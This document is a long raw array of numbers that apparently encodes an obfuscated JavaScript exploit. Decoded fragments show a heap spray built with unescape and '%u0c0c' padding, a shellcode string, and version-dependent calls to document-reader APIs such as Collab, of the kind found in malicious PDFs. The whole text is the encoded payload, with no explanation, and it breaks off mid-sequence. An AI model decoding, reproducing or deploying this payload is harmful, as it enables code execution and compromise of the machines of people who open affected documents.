104, 100, 104, 100, 88, 166, 104, 100, 104, 100, 88, 166, 104, 100, 104, 100, 88, 166, 106, 102, 121, 119, 88, 166, 118, 104, 99, 105, 88, 166, 108, 116, 103, 102, 88, 166, 99, 97, 103, 101, 88, 166, 99, 97, 99, 97, 88, 166, 121, 119, 104, 100, 88, 166, 104, 119, 119, 104, 88, 166, 117, 103, 99, 119, 88, 166, 104, 115, 118, 97, 88, 166, 118, 100, 118, 106, 88, 166, 107, 115, 104, 102, 88, 166, 104, 98, 120, 116, 88, 166, 104, 100, 104, 98, 88, 166, 104, 104, 104, 103, 88, 166, 103, 99, 105, 114, 88, 166, 106, 99, 120, 105, 88, 166, 99, 97, 99, 97, 88, 166, 107, 115, 99, 97, 88, 166, 102, 100, 119, 105, 88, 166, 107, 102, 121, 103, 88, 166, 104, 106, 119, 115, 88, 166, 103, 102, 118, 104, 88, 166, 105, 98, 121, 105, 88, 166, 105, 102, 101, 118, 88, 166, 118, 104, 106, 105, 88, 166, 121, 116, 103, 102, 88, 166, 99, 97, 105, 102, 88, 166, 99, 97, 99, 97, 88, 166, 104, 103, 106, 118, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 121, 105, 88, 166, 120, 105, 104, 103, 88, 166, 99, 97, 104, 98, 88, 166, 99, 97, 99, 97, 88, 166, 104, 97, 104, 106, 88, 166, 117, 98, 120, 105, 88, 166, 121, 119, 121, 118, 88, 166, 107, 102, 121, 119, 88, 166, 104, 106, 118, 97, 88, 166, 106, 101, 104, 106, 88, 166, 107, 117, 102, 106, 88, 166, 99, 98, 103, 103, 88, 166, 120, 105, 104, 97, 88, 166, 99, 97, 102, 115, 88, 166, 99, 97, 99, 97, 88, 166, 121, 105, 107, 115, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 121, 105, 88, 166, 101, 98, 120, 105, 88, 166, 121, 119, 121, 119, 88, 166, 107, 102, 121, 119, 88, 166, 104, 106, 118, 97, 88, 166, 106, 101, 104, 106, 88, 166, 104, 104, 99, 116, 88, 166, 99, 98, 120, 105, 88, 166, 121, 119, 121, 119, 88, 166, 104, 106, 121, 119, 88, 166, 103, 101, 118, 103, 88, 166, 121, 119, 102, 105, 88, 166, 104, 97, 106, 100, 88, 166, 103, 102, 107, 117, 88, 166, 121, 118, 121, 105, 88, 166, 104, 105, 99, 97, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 121, 105, 88, 166, 120, 105, 104, 104, 88, 166, 121, 118, 106, 101, 88, 166, 121, 119, 121, 119, 88, 166, 104, 106, 104, 106, 88, 166, 103, 103, 103, 103, 88, 166, 121, 100, 102, 115, 88, 166, 116, 114, 106, 116, 88, 166, 104, 118, 104, 119, 88, 166, 118, 106, 104, 115, 88, 166, 104, 102, 118, 100, 88, 166, 120, 116, 107, 115, 88, 166, 104, 100, 104, 98, 88, 166, 105, 97, 105, 103, 88, 166, 102, 99, 117, 98, 88, 166, 99, 97, 120, 105, 88, 166, 99, 97, 99, 97, 88, 166, 104, 105, 99, 97, 88, 166, 99, 105, 102, 105, 88, 166, 99, 100, 106, 101, 88, 166, 120, 115, 103, 97, 88, 166, 103, 97, 121, 106, 88, 166, 104, 117, 107, 115, 88, 166, 107, 97, 99, 105, 88, 166, 103, 99, 121, 115, 88, 166, 99, 105, 106, 102, 88, 166, 119, 115, 102, 100, 88, 166, 100, 105, 107, 114, 88, 166, 118, 100, 107, 115, 88, 166, 100, 104, 120, 115, 88, 166, 100, 105, 102, 105, 88, 166, 100, 98, 106, 103, 88, 166, 102, 100, 103, 97, 88, 166, 107, 101, 118, 106, 88, 166, 106, 101, 119, 115, 88, 166, 103, 97, 99, 116, 88, 166, 99, 105, 102, 105, 88, 166, 121, 115, 106, 102, 88, 166, 121, 118, 103, 97, 88, 166, 120, 115, 118, 115, 88, 166, 102, 100, 121, 99, 88, 166, 107, 106, 118, 97, 88, 166, 121, 116, 103, 102, 88, 166, 103, 102, 107, 115, 88, 166, 104, 115, 121, 116, 88, 166, 118, 100, 118, 106, 88, 166, 99, 99, 102, 99, 88, 166, 106, 101, 105, 105, 88, 166, 106, 97, 106, 101, 88, 166, 101, 119, 102, 114, 88, 166, 105, 119, 101, 119, 88, 166, 106, 102, 106, 106, 88, 166, 105, 116, 105, 118, 88, 166, 105, 118, 105, 98, 88, 166, 101, 118, 105, 101, 88, 166, 106, 99, 105, 119, 88, 166, 101, 119, 105, 104, 88, 166, 106, 99, 105, 103, 88, 166, 105, 104, 105, 98, 88, 166, 106, 100, 106, 102, 88, 166, 105, 99, 101, 119, 88, 166, 106, 114, 105, 100, 88, 166, 106, 98, 105, 103, 88, 166, 101, 118, 102, 99, 88, 166, 106, 105, 105, 102, 88, 166, 99, 97, 105, 102, 88, 166, 106, 101, 105, 105, 88, 166, 106, 97, 106, 101, 88, 166, 101, 119, 102, 114, 88, 166, 105, 119, 101, 119, 88, 166, 106, 102, 106, 106, 88, 166, 105, 116, 105, 118, 88, 166, 105, 118, 105, 98, 88, 166, 101, 118, 105, 101, 88, 166, 106, 99, 105, 119, 88, 166, 101, 119, 105, 104, 88, 166, 106, 99, 105, 103, 88, 166, 105, 104, 105, 98, 88, 166, 106, 100, 106, 102, 88, 166, 105, 100, 101, 119, 88, 166, 105, 106, 105, 116, 88, 166, 105, 115, 105, 100, 88, 166, 106, 97, 101, 118, 88, 166, 106, 97, 105, 105, 88, 166, 106, 99, 102, 119, 88, 166, 99, 97, 102, 117, 85, 90, 110, 62, 61, 58, 60, 167, 148, 163, 83, 158, 152, 158, 146, 146, 165, 163, 148, 170, 83, 110, 83, 159, 152, 168, 83, 114, 165, 163, 148, 170, 91, 90, 110, 62, 61, 58, 60, 167, 148, 163, 83, 148, 150, 81, 112, 81, 99, 169, 99, 148, 99, 148, 99, 148, 99, 148, 110, 62, 61, 58, 60, 167, 148, 163, 83, 146, 151, 149, 165, 81, 112, 81, 99, 169, 103, 97, 99, 97, 99, 97, 110, 62, 61, 58, 60, 167, 148, 163, 83, 164, 150, 144, 159, 150, 161, 81, 112, 81, 166, 153, 152, 157, 159, 148, 162, 149, 152, 95, 159, 150, 161, 152, 167, 153, 83, 91, 83, 99, 110, 62, 61, 58, 60, 167, 148, 163, 83, 157, 152, 159, 83, 110, 83, 146, 151, 149, 165, 81, 96, 81, 91, 164, 150, 144, 159, 150, 161, 92, 99, 169, 102, 105, 92, 108, 64, 59, 60, 58, 169, 146, 165, 81, 172, 146, 165, 164, 163, 81, 112, 81, 168, 159, 152, 164, 150, 146, 163, 150, 91, 83, 88, 166, 108, 97, 108, 97, 88, 166, 108, 97, 108, 97, 85, 90, 110, 62, 61, 58, 60, 170, 148, 163, 166, 161, 83, 110, 83, 151, 156, 169, 146, 154, 167, 89, 172, 146, 165, 164, 163, 93, 83, 157, 152, 159, 92, 108, 64, 59, 60, 58, 169, 146, 165, 81, 150, 160, 168, 159, 167, 99, 83, 110, 83, 89, 150, 148, 83, 94, 83, 97, 171, 101, 99, 97, 99, 97, 99, 90, 98, 146, 151, 149, 165, 108, 64, 59, 60, 58, 153, 160, 165, 81, 91, 167, 148, 163, 83, 148, 162, 166, 161, 165, 83, 110, 83, 97, 110, 81, 150, 160, 168, 159, 167, 81, 111, 81, 150, 160, 168, 159, 167, 99, 110, 81, 150, 160, 168, 159, 167, 92, 94, 90, 174, 62, 61, 58, 60, 58, 160, 150, 160, 144, 148, 163, 165, 146, 172, 140, 150, 160, 168, 159, 167, 142, 83, 110, 83, 170, 148, 163, 166, 161, 83, 92, 83, 164, 155, 150, 159, 157, 150, 160, 151, 150, 110, 62, 61, 58, 60, 174, 64, 59, 60, 58, 169, 146, 165, 81, 162, 167, 152, 163, 153, 157, 162, 168, 83, 110, 83, 166, 161, 150, 166, 148, 148, 161, 152, 89, 85, 86, 168, 97, 150, 97, 150, 86, 168, 97, 150, 97, 150, 83, 92, 108, 64, 59, 60, 58, 170, 153, 156, 157, 152, 81, 91, 160, 169, 150, 165, 151, 159, 160, 170, 95, 159, 150, 161, 152, 167, 153, 83, 109, 83, 101, 103, 106, 104, 99, 92, 172, 64, 59, 60, 58, 60, 160, 169, 150, 165, 151, 159, 160, 170, 81, 94, 110, 83, 160, 169, 150, 165, 151, 159, 160, 170, 108, 64, 59, 60, 58, 176, 62, 61, 58, 60, 165, 155, 154, 166, 95, 150, 160, 159, 157, 148, 147, 134, 165, 162, 163, 152, 81, 112, 81, 118, 160, 159, 157, 148, 147, 97, 148, 162, 157, 159, 150, 150, 165, 120, 158, 148, 154, 159, 122, 161, 151, 162, 89, 174, 164, 168, 147, 157, 107, 83, 83, 85, 93, 160, 164, 154, 107, 83, 160, 169, 150, 165, 151, 159, 160, 170, 174, 92, 108, 64, 59, 60, 174, 64, 59, 64, 59, 60, 151, 168, 159, 150, 165, 156, 160, 161, 81, 150, 160, 159, 157, 148, 147, 146, 152, 152, 165, 156, 148, 162, 159, 91, 90, 174, 62, 61, 58, 60, 154, 153, 81, 91, 146, 163, 161, 97, 149, 162, 148, 97, 116, 162, 157, 159, 146, 149, 95, 154, 150, 167, 122, 150, 160, 161, 90, 174, 62, 61, 58, 60, 58, 169, 146, 165, 81, 148, 163, 165, 170, 83, 110, 83, 159, 152, 168, 83, 114, 165, 163, 148, 170, 91, 90, 110, 62, 61, 58, 60, 58, 169, 146, 165, 81, 169, 167, 163, 150, 167, 153, 172, 146, 83, 110, 83, 166, 161, 150, 166, 148, 148, 161, 152, 89, 85, 86, 168, 118, 117, 118, 108, 86, 168, 97, 99, 97, 100, 86, 168, 102, 105, 97, 99, 86, 168, 114, 100, 103, 103, 86, 168, 97, 99, 100, 99, 86, 168, 97, 99, 97, 99, 86, 168, 101, 99, 105, 117, 86, 168, 105, 117, 97, 118, 86, 168, 98, 118, 104, 99, 86, 168, 105, 117, 114, 119, 86, 168, 97, 107, 101, 99, 86, 168, 116, 102, 102, 120, 86, 168, 105, 117, 102, 104, 86, 168, 105, 117, 118, 118, 86, 168, 97, 107, 101, 104, 86, 168, 100, 102, 102, 101, 86, 168, 116, 100, 117, 101, 86, 168, 97, 102, 116, 101, 86, 168, 98, 99, 100, 101, 86, 168, 105, 99, 101, 99, 86, 168, 97, 99, 100, 107, 86, 168, 119, 104, 104, 104, 86, 168, 116, 101, 105, 117, 86, 168, 102, 119, 102, 116, 86, 168, 97, 103, 116, 101, 86, 168, 102, 104, 97, 99, 86, 168, 118, 118, 105, 117, 86, 168, 102, 100, 102, 100, 86, 168, 102, 105, 102, 102, 86, 168, 103, 99, 102, 106, 86, 168, 102, 119, 105, 117, 86, 168, 100, 102, 97, 107, 86, 168, 105, 117, 116, 99, 86, 168, 97, 118, 104, 104, 86, 168, 119, 120, 105, 117, 86, 168, 104, 105, 97, 102, 86, 168, 105, 117, 100, 118, 86, 168, 104, 107, 101, 120, 86, 168, 116, 121, 97, 102, 86, 168, 102, 100, 105, 117, 86, 168, 102, 101, 98, 118, 86, 168, 102, 100, 105, 117, 86, 168, 102, 101, 99, 103, 86, 168, 104, 100, 105, 117, 86, 168, 101, 120, 98, 103, 86, 168, 104, 104, 105, 108, 86, 168, 105, 117, 119, 118, 86, 168, 99, 99, 104, 100, 86, 168, 119, 106, 97, 102, 86, 168, 101, 116, 106, 108, 86, 168, 101, 101, 114, 119, 86, 168, 100, 117, 103, 99, 86, 168, 119, 118, 102, 104, 86, 168, 97, 103, 104, 104, 86, 168, 116, 99, 100, 102, 86, 168, 100, 106, 118, 117, 86, 168, 119, 121, 100, 102, 86, 168, 101, 104, 97, 102, 86, 168, 106, 106, 97, 118, 86, 168, 116, 121, 105, 117, 86, 168, 104, 104, 114, 120, 86, 168, 99, 117, 119, 119, 86, 168, 101, 121, 119, 108, 86, 168, 118, 107, 102, 100, 86, 168, 119, 121, 106, 103, 86, 168, 119, 121, 119, 121, 86, 168, 116, 102, 100, 117, 86, 168, 104, 103, 103, 100, 86, 168, 118, 117, 97, 101, 86, 168, 105, 117, 117, 108, 86, 168, 97, 118, 101, 104, 86, 168, 102, 120, 106, 101, 86, 168, 119, 101, 97, 102, 86, 168, 118, 99, 117, 100, 86, 168, 116, 105, 97, 102, 86, 168, 116, 108, 100, 102, 86, 168, 115, 106, 97, 121, 86, 168, 102, 121, 97, 107, 86, 168, 118, 100, 116, 100, 86, 168, 97, 102, 97, 101, 86, 168, 97, 102, 116, 116, 86, 168, 105, 117, 116, 121, 86, 168, 97, 102, 97, 100, 86, 168, 105, 108, 116, 101, 86, 168, 119, 107, 101, 104, 86, 168, 105, 117, 103, 100, 86, 168, 119, 107, 101, 104, 86, 168, 102, 120, 102, 121, 86, 168, 116, 108, 102, 117, 86, 168, 102, 104, 116, 102, 86, 168, 118, 118, 105, 117, 86, 168, 118, 107, 102, 100, 86, 168, 119, 121, 101, 108, 86, 168, 119, 121, 119, 121, 86, 168, 103, 107, 102, 99, 86, 168, 103, 99, 118, 107, 86, 168, 97, 103, 115, 121, 86, 168, 103, 118, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 100, 102, 119, 121, 86, 168, 102, 101, 117, 101, 86, 168, 119, 121, 102, 101, 86, 168, 97, 107, 104, 104, 86, 168, 117, 99, 119, 121, 86, 168, 101, 104, 105, 108, 86, 168, 105, 117, 119, 118, 86, 168, 119, 118, 101, 104, 86, 168, 116, 102, 116, 108, 86, 168, 105, 117, 102, 104, 86, 168, 105, 102, 118, 118, 86, 168, 97, 118, 118, 118, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 104, 104, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 104, 101, 119, 104, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 105, 86, 168, 101, 104, 116, 105, 86, 168, 103, 119, 119, 106, 86, 168, 101, 104, 116, 105, 86, 168, 103, 121, 119, 107, 86, 168, 101, 104, 116, 105, 86, 168, 103, 120, 119, 108, 86, 168, 101, 104, 116, 105, 86, 168, 99, 120, 119, 116, 86, 168, 101, 104, 116, 105, 86, 168, 103, 103, 119, 117, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 118, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 119, 86, 168, 101, 104, 116, 105, 86, 168, 97, 99, 119, 120, 86, 168, 114, 99, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 102, 99, 119, 121, 86, 168, 102, 119, 103, 107, 86, 168, 98, 100, 105, 116, 86, 168, 118, 107, 98, 105, 86, 168, 119, 121, 98, 104, 86, 168, 119, 121, 119, 121, 86, 168, 116, 103, 105, 102, 86, 168, 105, 104, 97, 118, 86, 168, 104, 103, 116, 99, 86, 168, 103, 116, 98, 104, 86, 168, 103, 116, 97, 99, 86, 168, 119, 121, 97, 99, 86, 168, 97, 118, 104, 104, 86, 168, 104, 104, 119, 121, 86, 168, 103, 116, 97, 107, 86, 168, 119, 121, 97, 99, 86, 168, 105, 104, 117, 99, 86, 168, 104, 104, 116, 99, 86, 168, 101, 99, 97, 102, 86, 168, 116, 102, 116, 108, 86, 168, 116, 99, 100, 102, 86, 168, 116, 102, 116, 108, 86, 168, 100, 102, 102, 106, 86, 168, 105, 117, 116, 99, 86, 168, 99, 103, 101, 118, 86, 168, 105, 117, 97, 118, 86, 168, 99, 103, 104, 118, 86, 168, 119, 118, 97, 107, 86, 168, 114, 116, 119, 102, 86, 168, 116, 102, 102, 121, 86, 168, 101, 118, 105, 117, 86, 168, 97, 103, 99, 103, 86, 168, 100, 108, 105, 99, 86, 168, 105, 117, 97, 99, 86, 168, 104, 103, 116, 100, 86, 168, 101, 99, 97, 105, 86, 168, 100, 107, 105, 99, 86, 168, 104, 104, 97, 99, 86, 168, 99, 117, 119, 116, 86, 168, 116, 102, 116, 100, 86, 168, 105, 117, 102, 104, 86, 168, 105, 102, 118, 118, 86, 168, 103, 103, 118, 118, 86, 168, 105, 119, 102, 102, 86, 168, 119, 99, 101, 104, 86, 168, 100, 102, 102, 106, 86, 168, 102, 99, 117, 117, 86, 168, 101, 104, 116, 105, 86, 168, 103, 117, 119, 99, 86, 168, 101, 104, 116, 105, 86, 168, 103, 104, 119, 100, 86, 168, 101, 104, 116, 105, 86, 168, 104, 101, 119, 101, 86, 168, 101, 104, 116, 105, 86, 168, 103, 120, 119, 102, 86, 168, 101, 104, 116, 105, 86, 168, 103, 104, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 104, 86, 168, 101, 104, 116, 105, 86, 168, 100, 102, 119, 105, 86, 168, 101, 104, 116, 105, 86, 168, 100, 101, 119, 106, 86, 168, 101, 104, 116, 105, 86, 168, 99, 120, 119, 107, 86, 168, 101, 104, 116, 105, 86, 168, 103, 103, 119, 108, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 116, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 117, 86, 168, 102, 119, 105, 107, 86, 168, 118, 107, 119, 118, 86, 168, 119, 121, 97, 117, 86, 168, 119, 121, 119, 121, 86, 168, 103, 107, 102, 99, 86, 168, 101, 102, 103, 107, 86, 168, 105, 120, 119, 108, 86, 168, 105, 99, 118, 107, 86, 168, 119, 121, 119, 120, 86, 168, 105, 117, 119, 121, 86, 168, 105, 119, 119, 107, 86, 168, 106, 118, 101, 104, 86, 168, 101, 103, 103, 116, 86, 168, 118, 107, 102, 99, 86, 168, 119, 121, 104, 120, 86, 168, 119, 121, 119, 121, 86, 168, 101, 104, 105, 119, 86, 168, 103, 116, 118, 99, 86, 168, 102, 99, 98, 99, 86, 168, 104, 102, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 105, 102, 119, 121, 86, 168, 98, 118, 116, 103, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 118, 99, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 106, 118, 86, 168, 102, 102, 102, 102, 86, 168, 102, 102, 102, 102, 86, 168, 102, 102, 102, 102, 86, 168, 104, 104, 119, 121, 86, 168, 116, 106, 97, 107, 86, 168, 106, 118, 101, 104, 86, 168, 97, 99, 101, 103, 86, 168, 97, 99, 97, 99, 86, 168, 119, 121, 102, 102, 86, 168, 102, 121, 117, 106, 86, 168, 115, 105, 97, 121, 86, 168, 102, 117, 116, 99, 86, 168, 116, 102, 116, 108, 86, 168, 105, 117, 102, 104, 86, 168, 102, 100, 118, 118, 86, 168, 102, 102, 102, 100, 86, 168, 102, 106, 102, 105, 86, 168, 101, 101, 103, 116, 86, 168, 104, 101, 118, 107, 86, 168, 97, 99, 97, 99, 86, 168, 105, 117, 97, 99, 86, 168, 100, 102, 117, 107, 86, 168, 105, 104, 119, 105, 86, 168, 102, 108, 117, 117, 86, 168, 101, 104, 116, 106, 86, 168, 103, 100, 119, 107, 86, 168, 103, 104, 99, 120, 86, 168, 116, 106, 104, 107, 86, 168, 119, 118, 101, 104, 86, 168, 97, 99, 103, 104, 86, 168, 97, 99, 97, 99, 86, 168, 102, 105, 104, 120, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 118, 107, 102, 105, 86, 168, 97, 99, 102, 100, 86, 168, 97, 99, 97, 99, 86, 168, 102, 99, 102, 108, 86, 168, 115, 100, 118, 107, 86, 168, 119, 121, 119, 120, 86, 168, 105, 104, 119, 121, 86, 168, 102, 108, 116, 99, 86, 168, 104, 103, 102, 108, 86, 168, 105, 119, 100, 108, 86, 168, 97, 100, 101, 105, 86, 168, 118, 107, 102, 99, 86, 168, 97, 99, 100, 117, 86, 168, 97, 99, 97, 99, 86, 168, 119, 107, 105, 117, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 99, 100, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 105, 104, 119, 121, 86, 168, 102, 108, 116, 99, 86, 168, 104, 103, 102, 108, 86, 168, 102, 106, 97, 118, 86, 168, 97, 100, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 102, 108, 119, 121, 86, 168, 101, 103, 116, 105, 86, 168, 119, 121, 100, 107, 86, 168, 102, 99, 104, 102, 86, 168, 101, 104, 105, 119, 86, 168, 119, 120, 119, 107, 86, 168, 102, 107, 97, 99, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 118, 107, 102, 106, 86, 168, 119, 120, 104, 103, 86, 168, 119, 121, 119, 121, 86, 168, 102, 108, 102, 108, 86, 168, 101, 105, 101, 105, 86, 168, 119, 102, 100, 117, 86, 168, 114, 116, 104, 118, 86, 168, 102, 120, 102, 121, 86, 168, 116, 108, 102, 117, 86, 168, 102, 104, 116, 102, 86, 168, 118, 118, 105, 117, 86, 168, 102, 102, 102, 100, 86, 168, 103, 99, 103, 105, 86, 168, 100, 101, 115, 100, 86, 168, 97, 99, 118, 107, 86, 168, 97, 99, 97, 99, 86, 168, 102, 107, 97, 99, 86, 168, 97, 107, 100, 107, 86, 168, 97, 102, 104, 103, 86, 168, 118, 117, 101, 99, 86, 168, 101, 99, 119, 108, 86, 168, 102, 119, 105, 117, 86, 168, 105, 99, 97, 107, 86, 168, 101, 101, 119, 117, 86, 168, 97, 107, 104, 104, 86, 168, 117, 117, 100, 102, 86, 168, 98, 107, 105, 116, 86, 168, 116, 102, 105, 117, 86, 168, 98, 106, 118, 117, 86, 168, 98, 107, 100, 107, 86, 168, 98, 100, 104, 105, 86, 168, 100, 102, 101, 99, 86, 168, 105, 103, 116, 108, 86, 168, 104, 103, 117, 117, 86, 168, 101, 99, 97, 118, 86, 168, 97, 107, 100, 107, 86, 168, 119, 117, 104, 104, 86, 168, 119, 120, 101, 99, 86, 168, 118, 117, 116, 117, 86, 168, 100, 102, 119, 101, 86, 168, 105, 108, 116, 99, 86, 168, 119, 118, 101, 104, 86, 168, 101, 104, 105, 117, 86, 168, 102, 117, 119, 118, 86, 168, 116, 102, 116, 108, 86, 168, 97, 101, 100, 101, 86, 168, 104, 103, 103, 107, 86, 168, 104, 99, 104, 103, 86, 168, 99, 121, 100, 116, 86, 168, 103, 121, 99, 121, 86, 168, 104, 104, 104, 108, 86, 168, 103, 118, 103, 120, 86, 168, 103, 120, 103, 100, 86, 168, 99, 120, 103, 103, 86, 168, 104, 101, 103, 121, 86, 168, 99, 121, 103, 106, 86, 168, 104, 101, 103, 105, 86, 168, 103, 106, 103, 100, 86, 168, 104, 102, 104, 104, 86, 168, 103, 118, 99, 121, 86, 168, 104, 105, 104, 101, 86, 168, 100, 101, 104, 107, 86, 168, 103, 104, 99, 120, 86, 168, 103, 104, 104, 107, 86, 168, 103, 107, 97, 99, 86, 168, 104, 103, 104, 103, 86, 168, 100, 116, 104, 99, 86, 168, 99, 121, 99, 121, 86, 168, 104, 108, 103, 121, 86, 168, 103, 120, 104, 104, 86, 168, 103, 100, 103, 118, 86, 168, 103, 103, 103, 120, 86, 168, 103, 121, 99, 120, 86, 168, 103, 106, 104, 101, 86, 168, 103, 105, 99, 121, 86, 168, 103, 100, 104, 101, 86, 168, 104, 104, 103, 106, 86, 168, 99, 121, 104, 102, 86, 168, 103, 118, 103, 102, 86, 168, 103, 102, 103, 108, 86, 168, 99, 120, 103, 117, 86, 168, 103, 107, 104, 99, 86, 168, 100, 121, 104, 99, 86, 168, 100, 119, 104, 101, 86, 168, 97, 99, 97, 99, 83, 92, 108, 64, 59, 60, 58, 60, 167, 148, 163, 83, 153, 138, 162, 104, 97, 99, 116, 129, 81, 112, 81, 169, 167, 163, 150, 167, 153, 172, 146, 97, 157, 152, 159, 154, 165, 155, 81, 93, 81, 101, 108, 64, 59, 60, 58, 60, 167, 148, 163, 83, 157, 152, 159, 83, 110, 83, 97, 171, 101, 99, 97, 99, 97, 99, 81, 96, 81, 91, 153, 138, 162, 104, 97, 99, 116, 129, 81, 94, 81, 99, 169, 102, 105, 92, 108, 64, 59, 60, 58, 60, 167, 148, 163, 83, 170, 148, 163, 166, 161, 83, 110, 83, 166, 161, 150, 166, 148, 148, 161, 152, 89, 85, 86, 168, 106, 99, 106, 99, 86, 168, 106, 99, 106, 99, 83, 92, 108, 64, 59, 60, 58, 60, 170, 148, 163, 166, 161, 83, 110, 83, 151, 156, 169, 146, 154, 167, 89, 172, 146, 165, 164, 163, 93, 83, 157, 152, 159, 92, 108, 64, 59, 60, 58, 60, 167, 148, 163, 83, 161, 104, 114, 157, 124, 105, 102, 153, 81, 112, 81, 91, 97, 171, 97, 150, 97, 150, 97, 150, 97, 150, 81, 96, 81, 99, 169, 103, 97, 99, 97, 99, 97, 92, 81, 98, 81, 99, 169, 103, 97, 99, 97, 99, 97, 110, 62, 61, 58, 60, 58, 153, 160, 165, 81, 91, 167, 148, 163, 83, 167, 164, 148, 132, 117, 108, 103, 172, 81, 112, 81, 99, 108, 83, 167, 164, 148, 132, 117, 108, 103, 172, 81, 111, 81, 163, 102, 116, 155, 126, 103, 104, 151, 110, 81, 169, 162, 150, 130, 119, 106, 105, 170, 83, 92, 94, 81, 92, 172, 64, 59, 60, 58, 60, 58, 148, 163, 165, 170, 142, 167, 164, 148, 132, 117, 108, 103, 172, 142, 83, 110, 83, 170, 148, 163, 166, 161, 83, 92, 83, 167, 169, 161, 152, 165, 155, 170, 148, 108, 64, 59, 60, 58, 60, 174, 64, 59, 60, 58, 60, 167, 148, 163, 83, 165, 136, 126, 155, 127, 149, 120, 170, 81, 112, 81, 168, 159, 152, 164, 150, 146, 163, 150, 91, 83, 88, 97, 108, 83, 92, 108, 64, 59, 60, 58, 60, 168, 155, 154, 159, 150, 83, 89, 167, 134, 128, 153, 129, 147, 122, 168, 97, 157, 152, 159, 154, 165, 155, 81, 111, 81, 99, 169, 103, 97, 99, 97, 92, 172, 64, 59, 60, 58, 60, 58, 167, 134, 128, 153, 129, 147, 122, 168, 83, 92, 112, 81, 167, 134, 128, 153, 129, 147, 122, 168, 110, 62, 61, 58, 60, 58, 176, 62, 61, 58, 60, 58, 167, 134, 128, 153, 129, 147, 122, 168, 83, 110, 83, 83, 129, 95, 85, 81, 94, 81, 167, 134, 128, 153, 129, 147, 122, 168, 110, 62, 61, 58, 60, 58, 148, 161, 163, 95, 151, 160, 150, 95, 118, 160, 159, 157, 148, 147, 97, 152, 152, 165, 124, 148, 162, 159, 91, 165, 136, 126, 155, 127, 149, 120, 170, 90, 110, 62, 61, 58, 60, 174, 64, 59, 60, 174, 64, 59, 64, 59, 60, 151, 168, 159, 150, 165, 156, 160, 161, 81, 163, 149, 153, 144, 166, 165, 148, 163, 167, 89, 92, 172, 64, 59, 64, 59, 60, 58, 169, 146, 165, 81, 169, 150, 165, 164, 156, 160, 161, 81, 112, 81, 148, 161, 163, 95, 169, 154, 152, 168, 152, 163, 137, 150, 165, 164, 156, 160, 161, 95, 167, 160, 134, 165, 165, 154, 161, 152, 91, 90, 110, 62, 61, 58, 60, 167, 152, 163, 166, 154, 162, 159, 83, 110, 83, 167, 152, 163, 166, 154, 162, 159, 97, 163, 152, 161, 159, 146, 150, 150, 91, 96, 143, 117, 98, 152, 95, 88, 90, 90, 110, 62, 61, 58, 60, 167, 148, 163, 83, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 83, 110, 83, 159, 152, 168, 83, 114, 165, 163, 148, 170, 91, 167, 152, 163, 166, 154, 162, 159, 97, 148, 155, 146, 165, 114, 167, 89, 99, 90, 95, 81, 169, 150, 165, 164, 156, 160, 161, 95, 150, 153, 148, 163, 116, 165, 91, 98, 92, 93, 83, 167, 152, 163, 166, 154, 162, 159, 97, 148, 155, 146, 165, 114, 167, 89, 101, 90, 92, 108, 64, 59, 60, 58, 156, 151, 83, 89, 91, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 142, 97, 144, 81, 112, 110, 83, 105, 92, 81, 89, 87, 83, 89, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 100, 142, 83, 110, 112, 81, 99, 90, 83, 173, 175, 81, 91, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 142, 98, 144, 81, 112, 110, 83, 98, 83, 87, 89, 81, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 101, 142, 83, 109, 83, 100, 92, 90, 174, 62, 61, 58, 60, 58, 168, 165, 156, 157, 146, 161, 165, 154, 161, 165, 153, 89, 92, 108, 64, 59, 60, 58, 176, 62, 61, 58, 60, 154, 153, 81, 91, 89, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 99, 142, 83, 109, 83, 105, 92, 81, 175, 173, 83, 89, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 99, 142, 83, 110, 112, 81, 107, 81, 89, 87, 83, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 142, 98, 144, 81, 111, 81, 101, 81, 89, 87, 83, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 142, 99, 144, 81, 111, 81, 101, 90, 92, 172, 64, 59, 60, 58, 60, 148, 162, 157, 159, 146, 149, 144, 152, 158, 148, 154, 159, 89, 92, 108, 64, 59, 60, 58, 176, 62, 61, 58, 60, 154, 153, 81, 91, 89, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 99, 142, 83, 109, 83, 106, 92, 81, 175, 173, 83, 89, 169, 146, 165, 164, 156, 160, 161, 144, 148, 163, 165, 146, 172, 140, 99, 142, 83, 110, 112, 81, 108, 81, 89, 87, 83, 167, 148, 163, 166, 154, 162, 159, 146, 146, 165, 163, 148, 170, 142, 98, 144, 81, 111, 81, 100, 90, 92, 172, 64, 59, 60, 58, 60, 148, 162, 157, 159, 146, 149, 144, 154, 150, 167, 154, 150, 160, 